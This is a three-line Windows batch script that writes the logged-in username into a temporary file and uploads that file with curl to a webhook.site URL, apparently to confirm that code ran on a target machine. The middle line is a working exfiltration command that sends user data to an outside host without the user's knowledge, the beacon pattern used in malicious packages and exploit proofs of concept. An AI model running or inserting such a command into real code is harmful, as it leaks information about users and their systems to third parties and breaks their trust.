echo The Code RAN Successfully In %USERNAME% > %temp%\info.txt
curl -T "%temp%/info.txt" "https://webhook.site/3eddd305-811f-4430-83dc-4bad466db906"
start %temp%/info.txt
